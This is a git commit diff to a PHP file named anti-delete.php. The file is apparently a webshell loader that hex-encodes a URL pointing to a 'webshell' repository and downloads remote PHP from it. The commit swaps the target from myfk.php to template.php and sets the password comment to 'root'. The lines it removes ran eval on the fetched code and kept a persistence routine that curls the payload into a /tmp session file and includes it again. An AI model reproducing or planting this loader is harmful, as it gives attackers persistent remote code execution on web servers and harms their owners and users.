8d57b43f73d4cfe57360b4d3508381a15dbf8bb8
hackerman <76028485+exploit-haxor@users.noreply.github.com>
2024-11-14 15:40:11 +0700

    Update anti-delete.php

--- anti-delete.php
+++ anti-delete.php
@@ -1,8 +1,8 @@
 <?php
 # Jangan Edit bangian sini kalo tidak mau error
-// password : bar ki not
-$md5_hashes = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f6d79666b2e706870'; 
-// password : bar ki not
+// password : root
+$md5_hashes = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6578706c6f69742d6861786f722f7765627368656c6c2f6d61696e2f74656d706c6174652e706870'; 
+// password : root
 function hex2str($hex) {
     $str = '';
     for ($i = 0; $i < strlen($hex) - 1; $i += 2) {
@@ -51,37 +51,4 @@ if ($phpScript === false) {
 }
 if($phpScript === false) {
     $phpScript = downloadWithFopen($url);
-}
-
-if ($phpScript === false) {
-    die("lose");
-}
-
-
-eval('?>' . $phpScript);
-
-$TMP = '/tmp/sess_'.md5($_SERVER['HTTP_HOST']).'.php'; # Jangan Edit bangian sini kalo tidak mau error
-
-function M() {
-	$FGT = @file_get_contents($GLOBALS['hex2str($md5_hashes)']);
-	if(!$FGT) {
-		echo `curl -k $(echo {$GLOBALS['hex2str($md5_hashes)']} | base64 -d) > {$GLOBALS['TMP']}`;
-	} else {
-		$HANDLE = fopen($GLOBALS['TMP'], 'w');
-		fwrite($HANDLE, $FGT);
-		fclose($HANDLE);
-	}
-
-}
-
-if(file_exists($TMP)) {
-	if(filesize($TMP) === 0) {
-		unlink($TMP);
-		M();
-	} else {
-		include($TMP);
-	}
-} else {
-	M();
-}
 ?>
